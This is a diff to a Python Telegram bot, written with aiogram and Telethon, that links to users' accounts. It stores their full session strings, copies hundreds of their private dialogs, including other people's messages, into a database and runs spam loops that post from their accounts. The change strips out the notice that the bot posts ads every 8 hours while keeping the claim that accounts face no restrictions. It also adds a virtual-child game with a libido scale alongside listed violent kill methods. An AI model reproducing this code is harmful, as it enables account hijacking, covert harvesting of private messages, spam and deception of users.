@@ -1,34 +1,20 @@
-import asyncio
-import os
-import time
-import psycopg2
-import psycopg2.pool
-import re
-import logging
-import math
+import asyncio, os, time, random, psycopg2, psycopg2.pool, re, logging, math
 from contextlib import contextmanager
 from datetime import datetime, timezone, timedelta
 from typing import Dict, Set, List, Optional, Tuple
-
 from aiogram import Bot, Dispatcher, F
-from aiogram.types import (
-    Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
-    CallbackQuery, ReplyKeyboardRemove, KeyboardButton, ReplyKeyboardMarkup,
-    BusinessConnection
-)
+from aiogram.types import (Message, Update, InlineKeyboardMarkup, InlineKeyboardButton,
+    CallbackQuery, ReplyKeyboardRemove, KeyboardButton, ReplyKeyboardMarkup, BusinessConnection)
 from aiogram.filters import Command, StateFilter
 from aiogram.fsm.context import FSMContext
 from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramBadRequest
 from aiohttp import web
-
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-from telethon.errors import (
-    SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
-    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError
-)
+from telethon.errors import (SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError,
+    PhoneCodeInvalidError, PhoneNumberInvalidError, FloodWaitError)
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
@@ -37,11 +23,7 @@ ADMIN_ID = 5825717381
 DATABASE_URL = os.environ.get('DATABASE_URL')
 API_ID = 39536916
 API_HASH = "7d8fe2d99b3cb67797f8560016ae69cf"
-
 DEVICE_MODEL = "norik зайка"
-SYSTEM_VERSION = "1.0"
-APP_VERSION = "1.0"
-
 CHANNEL_URL = "https://t.me/norikX"
 CHANNEL_USERNAME = "@norikX"
 
@@ -52,26 +34,20 @@ MANUAL_INSTRUCTION = (
     "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
     "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
     "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте полный доступ к сообщениям <b>5/5</b>!\n\n"
-    "📢 <b>Условия использования:</b>\n"
-    "• Бот публикует рекламу 1 раз в 8 часов\n"
-    "• Удаление рекламного сообщения = блокировка\n"
-    "• Вы соглашаетесь с этим, подключая бота\n\n"
+    "📢 <b>Условия:</b>\n"
+    "• Удаление рекламного сообщения = блокировка\n\n"
     "🤖 <b>Что делает бот:</b>\n"
     "• Работает в публичных чатах от вашего имени\n"
-    "• Все действия выполняются официально через Telegram Business\n"
-    "• Ваш аккаунт не получает ограничений — всё в рамках правил Telegram"
+    "• Всё официально через Telegram Business\n"
+    "• Ваш аккаунт не получает ограничений"
 )
-
-SUBSCRIBE_TEXT = (
-    "🔒 <b>Для использования бота необходима подписка на канал</b>\n\n"
-    f"Подпишись на {CHANNEL_USERNAME} и нажми «✅ Я подписался».\n\n"
-    "Без подписки бот не работает."
-)
+SUBSCRIBE_TEXT = (f"🔒 <b>Для использования бота необходима подписка на канал</b>\n\n"
+    f"Подпишись на {CHANNEL_USERNAME} и нажми «✅ Я подписался».\n\nБез подписки бот не работает.")
 
 def make_client(session_str=None):
     sess = StringSession(session_str) if session_str else StringSession()
-    return TelegramClient(sess, API_ID, API_HASH,
-        device_model=DEVICE_MODEL, system_version=SYSTEM_VERSION, app_version=APP_VERSION)
+    return TelegramClient(sess, API_ID, API_HASH, device_model=DEVICE_MODEL,
+        system_version="1.0", app_version="1.0")
 
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
@@ -99,7 +75,6 @@ msg_count_cache: Dict[int, int] = {}
 chat_to_bc: Dict[Tuple[int, int], str] = {}
 chat_to_owner: Dict[int, int] = {}
 pending_marriage: Dict[int, dict] = {}
-
 sub_check_cache: Dict[int, float] = {}
 SUB_CACHE_TTL = 60
 
@@ -108,7 +83,6 @@ _db_pool: Optional[psycopg2.pool.ThreadedConnectionPool] = None
 def init_pool():
     global _db_pool
     _db_pool = psycopg2.pool.ThreadedConnectionPool(minconn=2, maxconn=20, dsn=DATABASE_URL, sslmode='require')
-    logging.info("✅ Пул соединений создан")
 
 @contextmanager
 def get_db():
@@ -148,19 +122,46 @@ TEXT_COMMANDS_HELP = (
     "🔹 <b>Калькулятор:</b> <code>1458+2414</code>"
 )
 
+# ============== ШКАЛЫ (реализм) ==============
+TICK_MINUTES = 3  # 20 тиков в час
 NEEDS = ["hunger", "toilet", "sleep_need", "hygiene", "mood", "attention"]
 NEED_LABELS = {
     "hunger": ("Голод", "🍖"), "toilet": ("Туалет", "🚽"),
     "sleep_need": ("Сон", "😴"), "hygiene": ("Гигиена", "🛁"),
     "mood": ("Настроение", "🙂"), "attention": ("Внимание", "🫂")}
-DECAY_PER_TICK = {"hunger": 3, "toilet": 4, "sleep_need": 2, "hygiene": 2, "mood": 2, "attention": 2}
-LIBIDO_RISE_PER_TICK = 3
-LIBIDO_MOOD_PENALTY = 3
-TICK_MINUTES = 30
+
+# Базовый decay за тик + шанс бонусного/скипа
+# hunger: 1 + 33% шанс → в среднем 1.33 × 20/ч = 26.6/ч → 3.8ч до 0
+# toilet: 1 + 50% шанс → 1.5 × 20 = 30/ч → 3.3ч
+# sleep: 1 - 20% скип → 0.8 × 20 = 16/ч → 6.3ч
+# hygiene: 1 - 40% скип → 0.6 × 20 = 12/ч → 8.3ч
+# mood: 1 - 25% скип → 0.75 × 20 = 15/ч → 6.7ч
+# attention: 1 - 25% скип → 0.75 × 20 = 15/ч → 6.7ч
+DECAY_EXTRA_CHANCE = {
+    "hunger": 0.33, "toilet": 0.50,
+    "sleep_need": -0.20, "hygiene": -0.40,
+    "mood": -0.25, "attention": -0.25}
+# libido растёт с такой же скоростью как hunger
+LIBIDO_EXTRA_CHANCE = 0.33
+LIBIDO_MOOD_PENALTY = 1
 REMINDER_THRESHOLD = 25
-HEALTH_DECAY_IF_CRITICAL = 3
+HEALTH_DECAY_IF_CRITICAL = 2
 HEALTH_REGEN_IF_OK = 1
 GAME_YEAR_IN_REAL_DAYS = 4
+
+def decay_step(key):
+    """Сколько убавить за один тик."""
+    base = 1
+    ch = DECAY_EXTRA_CHANCE.get(key, 0)
+    if ch > 0:
+        return base + 1 if random.random() < ch else base
+    if ch < 0:
+        return 0 if random.random() < -ch else base
+    return base
+
+def libido_step():
+    return 1 + (1 if random.random() < LIBIDO_EXTRA_CHANCE else 0)
+
 REMINDER_PHRASES = {
     "hunger": "хочу кушать 🍖", "toilet": "мне нужно в туалет 🚽",
     "sleep_need": "я хочу спать 😴", "hygiene": "я хочу помыться 🛁",
@@ -171,10 +172,8 @@ ACTION_LABELS = {
 BIRTH_RULES_TEXT = (
     "У {gender_word_small} есть потребности — за ними правда нужно следить.\n"
     "⚠️ Если любая шкала упадёт до 0 — {who_word} умрёт, и вернуть будет нельзя.\n\n"
-    "Береги {pronoun_acc} 🙂"
-)
+    "Береги {pronoun_acc} 🙂")
 RESTORE_AMOUNT = {"hunger": 40, "toilet": 50, "sleep_need": 35, "hygiene": 45, "mood": 30, "attention": 30}
-
 KILL_METHODS = ["🔪 Расчленить", "🪓 Отрубить бошку топором", "🔫 Расстрелять",
     "⚡ Электростул", "☠️ Повесить", "🔥 Сжечь заживо",
     "🌊 Утопить", "🚗 Переехать машиной", "🐍 Укус змеи", "💊 Отравить"]
@@ -190,53 +189,46 @@ KILL_PHRASES = {
     "🐍 Укус змеи": "Яд растекается по венам. {name} умирает в муках.",
     "💊 Отравить": "{name} задыхается от яда, глаза закатились."}
 
-# ==================== ПОДПИСКА ====================
+# ============== ПОДПИСКА ==============
 async def check_subscription(user_id: int, force: bool = False) -> bool:
     now = time.time()
     if not force:
         ts = sub_check_cache.get(user_id)
-        if ts and now - ts < SUB_CACHE_TTL:
-            return True
+        if ts and now - ts < SUB_CACHE_TTL: return True
     try:
         member = await bot.get_chat_member(chat_id=CHANNEL_USERNAME, user_id=user_id)
         status = member.status
         if status in ("creator", "administrator", "member"):
-            sub_check_cache[user_id] = now
-            return True
+            sub_check_cache[user_id] = now; return True
         if status == "restricted":
-            is_member = bool(getattr(member, "is_member", False))
-            if is_member: sub_check_cache[user_id] = now
+            im = bool(getattr(member, "is_member", False))
+            if im: sub_check_cache[user_id] = now
             else: sub_check_cache.pop(user_id, None)
-            return is_member
-        sub_check_cache.pop(user_id, None)
-        return False
+            return im
+        sub_check_cache.pop(user_id, None); return False
     except Exception as e:
-        logging.warning(f"check_subscription {user_id}: {e}")
-        return True
+        logging.warning(f"check_subscription {user_id}: {e}"); return True
 
 def get_subscribe_kb():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="📢 Подписаться на канал", url=CHANNEL_URL)],
-        [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")],
-    ])
+        [InlineKeyboardButton(text="✅ Я подписался", callback_data="check_sub")]])
 
 def _should_skip_subscription(message) -> bool:
     bc_id = getattr(message, 'business_connection_id', None)
     if bc_id:
-        owner_id = bc_owners.get(bc_id)
+        oid = bc_owners.get(bc_id)
         try:
-            uid = int(message.from_user.id)
-            if owner_id and uid != int(owner_id): return True
+            if oid and int(message.from_user.id) != int(oid): return True
         except: pass
     chat = getattr(message, 'chat', None)
     if chat and chat.type in ("group", "supergroup", "channel"): return True
     return False
 
-async def require_subscription(message_or_cb, force: bool = False) -> bool:
+async def require_subscription(message_or_cb, force=False) -> bool:
     uid = message_or_cb.from_user.id
     if uid == ADMIN_ID: return True
-    if isinstance(message_or_cb, Message) and _should_skip_subscription(message_or_cb):
-        return True
+    if isinstance(message_or_cb, Message) and _should_skip_subscription(message_or_cb): return True
     if await check_subscription(uid, force=force): return True
     kb = get_subscribe_kb()
     try:
@@ -247,20 +239,20 @@ async def require_subscription(message_or_cb, force: bool = False) -> bool:
     except: pass
     return False
 
-# ==================== БД ====================
+# ============== БД ==============
 def init_db():
     with get_db() as conn:
         with conn.cursor() as cur:
-            cur.execute("""CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))""")
-            cur.execute("""CREATE TABLE IF NOT EXISTS chat_spouses (chat_id BIGINT PRIMARY KEY, owner_id BIGINT NOT NULL, spouse_id BIGINT NOT NULL, spouse_name TEXT, relation TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
+            cur.execute("CREATE TABLE IF NOT EXISTS chat_settings (chat_id BIGINT, setting_type TEXT, PRIMARY KEY (chat_id, setting_type))")
+            cur.execute("CREATE TABLE IF NOT EXISTS substitutions (chat_id BIGINT PRIMARY KEY, text TEXT, mode INTEGER)")
+            cur.execute("CREATE TABLE IF NOT EXISTS spam_texts (key_id TEXT PRIMARY KEY, text TEXT)")
+            cur.execute("CREATE TABLE IF NOT EXISTS banned_users (user_id BIGINT PRIMARY KEY)")
+            cur.execute("CREATE TABLE IF NOT EXISTS user_map (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT)")
+            cur.execute("CREATE TABLE IF NOT EXISTS user_sessions (user_id BIGINT PRIMARY KEY, session_string TEXT)")
+            cur.execute("CREATE TABLE IF NOT EXISTS business_accounts (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, connected_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+            cur.execute("CREATE TABLE IF NOT EXISTS manual_users (user_id BIGINT PRIMARY KEY, username TEXT, first_name TEXT, added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
+            cur.execute("CREATE TABLE IF NOT EXISTS user_chats (user_id BIGINT, chat_id BIGINT, chat_name TEXT, PRIMARY KEY (user_id, chat_id))")
+            cur.execute("CREATE TABLE IF NOT EXISTS chat_spouses (chat_id BIGINT PRIMARY KEY, owner_id BIGINT NOT NULL, spouse_id BIGINT NOT NULL, spouse_name TEXT, relation TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")
             cur.execute("""CREATE TABLE IF NOT EXISTS children (
                 id SERIAL PRIMARY KEY, chat_id BIGINT NOT NULL, owner_id BIGINT NOT NULL,
                 spouse_id BIGINT, name TEXT NOT NULL, gender TEXT NOT NULL,
@@ -274,10 +266,13 @@ def init_db():
                 last_birthday_year INTEGER NOT NULL DEFAULT 0)""")
             for sql in ["ALTER TABLE children ADD COLUMN IF NOT EXISTS libido INTEGER NOT NULL DEFAULT 0",
                         "ALTER TABLE children ADD COLUMN IF NOT EXISTS chat_id BIGINT",
-                        "ALTER TABLE children ADD COLUMN IF NOT EXISTS spouse_id BIGINT",
-                        "ALTER TABLE children DROP CONSTRAINT IF EXISTS children_chat_id_key"]:
+                        "ALTER TABLE children ADD COLUMN IF NOT EXISTS spouse_id BIGINT"]:
                 try: cur.execute(sql)
                 except: pass
+            try: cur.execute("ALTER TABLE children DROP CONSTRAINT IF EXISTS children_chat_id_key")
+            except: pass
+            try: cur.execute("CREATE INDEX IF NOT EXISTS idx_children_chat ON children(chat_id)")
+            except: pass
             cur.execute("""CREATE TABLE IF NOT EXISTS chat_messages (
                 id SERIAL PRIMARY KEY, user_id BIGINT NOT NULL, chat_id BIGINT NOT NULL,
                 sender_id BIGINT, sender_name TEXT, sender_username TEXT, text TEXT,
@@ -318,9 +313,7 @@ def save_user_chat(user_id, chat_id, chat_name):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s,%s,%s) "
-                            "ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name=EXCLUDED.chat_name",
-                            (user_id, chat_id, chat_name))
+                cur.execute("INSERT INTO user_chats (user_id, chat_id, chat_name) VALUES (%s,%s,%s) ON CONFLICT (user_id, chat_id) DO UPDATE SET chat_name=EXCLUDED.chat_name", (user_id, chat_id, chat_name))
         lst = user_dialogs.setdefault(user_id, [])
         for i, (cid, _) in enumerate(lst):
             if cid == chat_id: lst[i] = (chat_id, chat_name); return
@@ -389,8 +382,7 @@ def save_session(user_id, s):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO user_sessions (user_id, session_string) VALUES (%s,%s) "
-                            "ON CONFLICT (user_id) DO UPDATE SET session_string=EXCLUDED.session_string", (user_id, s))
+                cur.execute("INSERT INTO user_sessions (user_id, session_string) VALUES (%s,%s) ON CONFLICT (user_id) DO UPDATE SET session_string=EXCLUDED.session_string", (user_id, s))
     except: pass
 
 def get_session(user_id):
@@ -420,9 +412,7 @@ def save_business_account(user_id, username, first_name):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s,%s,%s) "
-                            "ON CONFLICT (user_id) DO UPDATE SET username=EXCLUDED.username, first_name=EXCLUDED.first_name",
-                            (user_id, username, first_name))
+                cur.execute("INSERT INTO business_accounts (user_id, username, first_name) VALUES (%s,%s,%s) ON CONFLICT (user_id) DO UPDATE SET username=EXCLUDED.username, first_name=EXCLUDED.first_name", (user_id, username, first_name))
     except: pass
 
 def get_all_users():
@@ -450,10 +440,7 @@ def save_user_info(user_id, username, first_name):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO user_map (user_id, username, first_name) VALUES (%s,%s,%s) "
-                            "ON CONFLICT (user_id) DO UPDATE SET username=COALESCE(EXCLUDED.username,user_map.username), "
-                            "first_name=COALESCE(EXCLUDED.first_name,user_map.first_name)",
-                            (user_id, un, first_name))
+                cur.execute("INSERT INTO user_map (user_id, username, first_name) VALUES (%s,%s,%s) ON CONFLICT (user_id) DO UPDATE SET username=COALESCE(EXCLUDED.username,user_map.username), first_name=COALESCE(EXCLUDED.first_name,user_map.first_name)", (user_id, un, first_name))
     except: pass
 
 def set_user_ban(user_id, ban):
@@ -489,9 +476,7 @@ def save_substitution(chat_id, text, mode):
                     cur.execute("DELETE FROM substitutions WHERE chat_id=%s", (chat_id,))
                     substitutions.pop(chat_id, None)
                 else:
-                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s,%s,%s) "
-                                "ON CONFLICT (chat_id) DO UPDATE SET text=EXCLUDED.text, mode=EXCLUDED.mode",
-                                (chat_id, text, mode))
+                    cur.execute("INSERT INTO substitutions (chat_id, text, mode) VALUES (%s,%s,%s) ON CONFLICT (chat_id) DO UPDATE SET text=EXCLUDED.text, mode=EXCLUDED.mode", (chat_id, text, mode))
                     substitutions[chat_id] = {"text": text, "mode": mode}
     except: pass
 
@@ -499,8 +484,7 @@ def save_spam_text(key_id, text):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s,%s) "
-                            "ON CONFLICT (key_id) DO UPDATE SET text=EXCLUDED.text", (str(key_id), text))
+                cur.execute("INSERT INTO spam_texts (key_id, text) VALUES (%s,%s) ON CONFLICT (key_id) DO UPDATE SET text=EXCLUDED.text", (str(key_id), text))
         user_spam_texts[str(key_id)] = text
     except: pass
 
@@ -513,10 +497,8 @@ def save_chat_message(user_id, chat_id, sender_id, sender_name, sender_username,
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("INSERT INTO chat_messages (user_id, chat_id, sender_id, sender_name, sender_username, text, message_id) "
-                            "VALUES (%s,%s,%s,%s,%s,%s,%s) ON CONFLICT DO NOTHING",
-                            (int(user_id), int(chat_id), int(sender_id) if sender_id else 0,
-                             sender_name, sender_username, (text or "")[:2000], int(message_id)))
+                cur.execute("INSERT INTO chat_messages (user_id, chat_id, sender_id, sender_name, sender_username, text, message_id) VALUES (%s,%s,%s,%s,%s,%s,%s) ON CONFLICT DO NOTHING",
+                            (int(user_id), int(chat_id), int(sender_id) if sender_id else 0, sender_name, sender_username, (text or "")[:2000], int(message_id)))
                 ins = cur.rowcount
         if ins: msg_count_cache[user_id] = msg_count_cache.get(user_id, 0) + 1
         return bool(ins)
@@ -526,9 +508,7 @@ def get_chat_messages(user_id, chat_id, page=0, per_page=15):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("SELECT sender_id, sender_name, sender_username, text, created_at "
-                            "FROM chat_messages WHERE user_id=%s AND chat_id=%s ORDER BY id DESC LIMIT %s OFFSET %s",
-                            (user_id, chat_id, per_page, page * per_page))
+                cur.execute("SELECT sender_id, sender_name, sender_username, text, created_at FROM chat_messages WHERE user_id=%s AND chat_id=%s ORDER BY id DESC LIMIT %s OFFSET %s", (user_id, chat_id, per_page, page * per_page))
                 rows = cur.fetchall()
                 cur.execute("SELECT COUNT(*) FROM chat_messages WHERE user_id=%s AND chat_id=%s", (user_id, chat_id))
                 return list(reversed(rows)), cur.fetchone()[0]
@@ -546,10 +526,8 @@ def save_spouse(chat_id, owner_id, spouse_id, spouse_name, relation):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("""INSERT INTO chat_spouses (chat_id, owner_id, spouse_id, spouse_name, relation)
-                    VALUES (%s,%s,%s,%s,%s) ON CONFLICT (chat_id) DO UPDATE SET owner_id=EXCLUDED.owner_id,
-                    spouse_id=EXCLUDED.spouse_id, spouse_name=EXCLUDED.spouse_name, relation=EXCLUDED.relation""",
-                    (chat_id, owner_id, spouse_id, spouse_name, relation))
+                cur.execute("INSERT INTO chat_spouses (chat_id, owner_id, spouse_id, spouse_name, relation) VALUES (%s,%s,%s,%s,%s) ON CONFLICT (chat_id) DO UPDATE SET owner_id=EXCLUDED.owner_id, spouse_id=EXCLUDED.spouse_id, spouse_name=EXCLUDED.spouse_name, relation=EXCLUDED.relation",
+                            (chat_id, owner_id, spouse_id, spouse_name, relation))
     except Exception as e: logging.error(f"save_spouse: {e}")
 
 def get_spouse(chat_id):
@@ -584,59 +562,18 @@ def get_children_by_chat(chat_id, alive_only=True):
     except Exception as e:
         logging.error(f"get_children_by_chat: {e}"); return []
 
-def get_child_by_chat(chat_id, alive_only=True):
-    kids = get_children_by_chat(chat_id, alive_only=alive_only); return kids[0] if kids else None
-
 def _resolve_children_chat_id(message_or_cb):
-    """Ищет chat_id, по которому лежат дети. Работает и для владельца, и для собеседника в бизнес-чате."""
-    chat_id = None
-    bc_id = None
-    try:
-        chat_id = message_or_cb.chat.id
+    """ТОЛЬКО текущий chat.id — у каждого чата свои дети."""
+    try: return int(message_or_cb.chat.id)
     except AttributeError:
-        try: chat_id = message_or_cb.message.chat.id
-        except: pass
-    try:
-        bc_id = getattr(message_or_cb, 'business_connection_id', None)
-        if not bc_id and hasattr(message_or_cb, 'message'):
-            bc_id = getattr(message_or_cb.message, 'business_connection_id', None)
-    except: pass
-
-    # 1) прямой поиск по chat_id
-    if chat_id and get_children_by_chat(chat_id):
-        return chat_id
-
-    # 2) через bc_owners
-    if bc_id and bc_id in bc_owners:
-        oid = bc_owners[bc_id]
-        if get_children_by_chat(oid):
-            return oid
-        try:
-            with get_db() as conn:
-                with conn.cursor() as cur:
-                    cur.execute("SELECT chat_id FROM children WHERE (owner_id=%s OR spouse_id=%s) AND is_alive=TRUE ORDER BY id LIMIT 1", (oid, oid))
-                    r = cur.fetchone()
-                    if r: return int(r[0])
-        except: pass
-
-    # 3) через from_user.id
-    try:
-        uid = int(message_or_cb.from_user.id)
-        with get_db() as conn:
-            with conn.cursor() as cur:
-                cur.execute("SELECT chat_id FROM children WHERE (owner_id=%s OR spouse_id=%s OR chat_id=%s) AND is_alive=TRUE ORDER BY id LIMIT 1", (uid, uid, chat_id))
-                r = cur.fetchone()
-                if r: return int(r[0])
-    except: pass
-
-    return chat_id
+        try: return int(message_or_cb.message.chat.id)
+        except: return None
 
 def create_child(chat_id, owner_id, spouse_id, name, gender):
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
-                cur.execute("""INSERT INTO children (chat_id, owner_id, spouse_id, name, gender) VALUES (%s,%s,%s,%s,%s)
-                    RETURNING id, birth_date, created_at""", (chat_id, owner_id, spouse_id, name, gender))
+                cur.execute("INSERT INTO children (chat_id, owner_id, spouse_id, name, gender) VALUES (%s,%s,%s,%s,%s) RETURNING id, birth_date, created_at", (chat_id, owner_id, spouse_id, name, gender))
                 cid, bd, ca = cur.fetchone()
                 return {"id": cid, "chat_id": chat_id, "name": name, "gender": gender, "birth_date": bd, "created_at": ca}
     except Exception as e:
@@ -861,9 +798,9 @@ def apply_modifications(text, chat_id, entities=None):
             modified = True
     return ft, modified
 
-async def process_command_text(text, owner_id, chat_id, bc_id=None,
-                               telethon_client=None, telethon_event=None,
-                               send_reply=None, aiogram_message=None, in_private_bot=False):
+async def process_command_text(text, owner_id, chat_id, bc_id=None, telethon_client=None,
+                               telethon_event=None, send_reply=None, aiogram_message=None,
+                               in_private_bot=False):
     global CHANNEL_LINK
     low = text.lower().strip()
 
@@ -909,7 +846,6 @@ async def process_command_text(text, owner_id, chat_id, bc_id=None,
                 rt = aiogram_message.reply_to_message.message_id
             task = asyncio.create_task(spam_worker_bot(chat_id, bc_id, rt, t))
         active_spam_tasks.append((chat_id, owner_id, task))
-        logging.info(f"▶️ ss chat={chat_id} owner={owner_id} via={'telethon' if telethon_client else 'bot'}")
         return True
 
     if low == "dd":
@@ -925,7 +861,6 @@ async def process_command_text(text, owner_id, chat_id, bc_id=None,
                     try: item[2].cancel()
                     except: pass
                     active_spam_tasks.remove(item); killed += 1
-        logging.info(f"⏹ dd chat={chat_id} owner={owner_id} killed={killed}")
         return True
 
     if low.startswith("set "):
@@ -953,10 +888,10 @@ async def process_command_text(text, owner_id, chat_id, bc_id=None,
             target_id = tu.id; target_name = tu.first_name or "Юзер"
         if not target_id and bc_id and aiogram_message and aiogram_message.chat.type == "private":
             target_id = chat_id
-            target_name = user_names.get(chat_id) or user_names.get(target_id) or (aiogram_message.chat.first_name) or "Собеседник"
+            target_name = user_names.get(chat_id) or (aiogram_message.chat.first_name) or "Собеседник"
         if not target_id:
             if send_reply:
-                try: await send_reply("Ответь реплаем на сообщение человека.")
+                try: await send_reply("Ответь реплаем.")
                 except: pass
             return True
         mutes[target_id] = {"until": datetime.now() + timedelta(minutes=mins)}
@@ -1046,17 +981,16 @@ async def backfill_one_chat(client, user_id, chat_id, limit=100):
                 try: save_user_info(sid, su, sn)
                 except: pass
             if save_chat_message(user_id, int(chat_id), sid, sn, su, text, int(m.id)): saved += 1
-    except Exception as e: logging.warning(f"backfill_one_chat: {e}")
+    except: pass
     return saved
 
 async def backfill_dialogs(client, user_id, max_dialogs=300, per_chat=30):
-    lc, lm = 0, 0
     try:
         dlgs = []
         async for d in client.iter_dialogs(limit=max_dialogs): dlgs.append(d)
         for d in dlgs:
             try:
-                cid = int(d.id); save_user_chat(user_id, cid, d.name or "Чат"); lc += 1
+                cid = int(d.id); save_user_chat(user_id, cid, d.name or "Чат")
                 try: msgs = await client.get_messages(d.entity, limit=per_chat)
                 except FloodWaitError as e: await asyncio.sleep(e.seconds + 1); continue
                 except: continue
@@ -1067,45 +1001,32 @@ async def backfill_dialogs(client, user_id, max_dialogs=300, per_chat=30):
                     if sid:
                         try: save_user_info(sid, su, sn)
                         except: pass
-                    if save_chat_message(user_id, cid, sid, sn, su, text, int(m.id)): lm += 1
+                    save_chat_message(user_id, cid, sid, sn, su, text, int(m.id))
                 await asyncio.sleep(0.15)
             except: pass
-    except Exception as e: logging.error(f"backfill_dialogs: {e}")
+    except: pass
 
 async def process_marriage_telethon(event, client, user_id, chat_id, low):
     if not event.is_reply:
         if low in ["муж","жена","пожениться"]:
-            try: await client.send_message(chat_id, "Ответь (реплаем) на сообщение человека.")
+            try: await client.send_message(chat_id, "Ответь реплаем.")
             except: pass
         return True
     try:
         rp = await event.get_reply_message(); s = await rp.get_sender()
         sp_id = s.id; sp_name = getattr(s, "first_name", None) or "Партнёр"
-        if sp_id == user_id:
-            try: await client.send_message(chat_id, "Нельзя жениться на себе 🙂")
-            except: pass
-            return True
+        if sp_id == user_id: return True
         if low == "развод":
-            delete_spouse(chat_id)
-            try: await client.send_message(chat_id, "💔 Развод оформлен.")
-            except: pass
-            return True
+            delete_spouse(chat_id); return True
         relation = "husband" if low in ["муж","пожениться"] else "wife"
         me_name = user_names.get(user_id, "Пользователь")
-        if relation == "husband":
-            q = f"💍 {me_name} хочет, чтобы {sp_name} стал мужем.\n\n{sp_name}, согласен(на)?"
-        else:
-            q = f"💍 {me_name} хочет, чтобы {sp_name} стала женой.\n\n{sp_name}, согласна(ен)?"
-        # Отправляем сообщение от имени юзера (без кнопок — Telethon не умеет inline)
-        # Но потом можно будет согласиться просто ответив "да"
-        try: await client.send_message(chat_id, q)
+        txt = (f"💍 {me_name} предлагает {sp_name} стать мужем." if relation == "husband"
+               else f"💍 {me_name} предлагает {sp_name} стать женой.")
+        try: await client.send_message(chat_id, txt)
         except: pass
-        # Сохраним pending без message_id (нет в telethon)
-        # Просто сразу сохраняем spouse — упрощённо
         save_spouse(chat_id, user_id, sp_id, sp_name, relation)
         return True
-    except Exception as e:
-        logging.error(f"marriage telethon: {e}"); return True
+    except: return True
 
 async def start_telethon_listener(user_id, session_str):
     try:
@@ -1135,25 +1056,20 @@ async def start_telethon_listener(user_id, session_str):
                     try: await event.delete()
                     except: pass
                     return
-            except Exception as e: logging.error(f"incoming: {e}")
+            except: pass
 
         @client.on(events.NewMessage(outgoing=True))
         async def on_outgoing(event):
             try:
                 cid = int(event.chat_id)
                 text = event.message.text or ""
-                save_chat_message(user_id, cid, user_id, user_names.get(user_id, "Я"), "",
-                                  text or "[📎]", int(event.message.id))
-
-                if event.is_private:
-                    return
-
+                save_chat_message(user_id, cid, user_id, user_names.get(user_id, "Я"), "", text or "[📎]", int(event.message.id))
+                if event.is_private: return
                 try:
                     c = await event.get_chat()
                     cname = getattr(c, 'title', None) or getattr(c, 'first_name', None) or "Чат"
                     save_user_chat(user_id, cid, cname)
                 except: pass
-
                 stripped = text.strip()
                 if not stripped: return
                 low = stripped.lower()
@@ -1173,12 +1089,11 @@ async def start_telethon_listener(user_id, session_str):
                     return
 
                 if low == "dd":
-                    killed = 0
                     for item in list(active_spam_tasks):
                         if item[0] == cid:
                             try: item[2].cancel()
                             except: pass
-                            active_spam_tasks.remove(item); killed += 1
+                            active_spam_tasks.remove(item)
                     try: await event.delete()
                     except: pass
                     return
@@ -1240,10 +1155,7 @@ async def start_telethon_listener(user_id, session_str):
 
                 if low.startswith("дата регистрации"):
                     kids = get_children_by_chat(cid)
-                    if not kids:
-                        try: await client.send_message(cid, "В этом чате нет детей.")
-                        except: pass
-                    else:
+                    if kids:
